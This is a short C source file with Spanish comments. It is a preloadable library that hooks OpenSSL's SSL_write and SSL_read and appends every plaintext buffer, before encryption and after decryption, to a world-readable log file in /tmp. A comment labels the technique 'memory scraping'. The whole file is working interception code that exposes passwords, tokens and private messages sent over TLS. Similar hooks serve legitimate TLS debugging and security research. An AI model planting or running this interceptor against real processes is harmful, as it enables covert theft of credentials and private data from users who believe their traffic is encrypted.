#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <openssl/ssl.h>
#include <unistd.h>
#include <fcntl.h>

// Punteros para almacenar las funciones originales de OpenSSL
static int (*real_SSL_read)(SSL *ssl, void *buf, int num) = NULL;
static int (*real_SSL_write)(SSL *ssl, const void *buf, int num) = NULL;

// Función auxiliar para registrar los datos interceptados en un fichero
void log_data(const char *prefix, const void *buf, int num) {
    int fd = open("/tmp/ssl_intercept.log", O_WRONLY | O_APPEND | O_CREAT, 0644);
    if (fd != -1) {
        write(fd, prefix, 10);
        write(fd, buf, num);
        write(fd, "\n---\n", 5);
        close(fd);
    }
}

// Interceptación de SSL_write (Datos antes de ser cifrados)
int SSL_write(SSL *ssl, const void *buf, int num) {
    if (!real_SSL_write) {
        real_SSL_write = dlsym(RTLD_NEXT, "SSL_write");
    }
    
    // Memory Scraping: Capturamos el buffer antes de enviarlo a la función real
    log_data("[WRITE]   ", buf, num);
    
    return real_SSL_write(ssl, buf, num);
}

// Interceptación de SSL_read (Datos después de ser descifrados)
int SSL_read(SSL *ssl, void *buf, int num) {
    if (!real_SSL_read) {
        real_SSL_read = dlsym(RTLD_NEXT, "SSL_read");
    }

    // Llamamos a la función real para que OpenSSL haga el descifrado
    int result = real_SSL_read(ssl, buf, num);

    // Si la lectura fue exitosa, registramos el buffer ya descifrado
    if (result > 0) {
        log_data("[READ ]   ", buf, result);
    }

    return result;
}
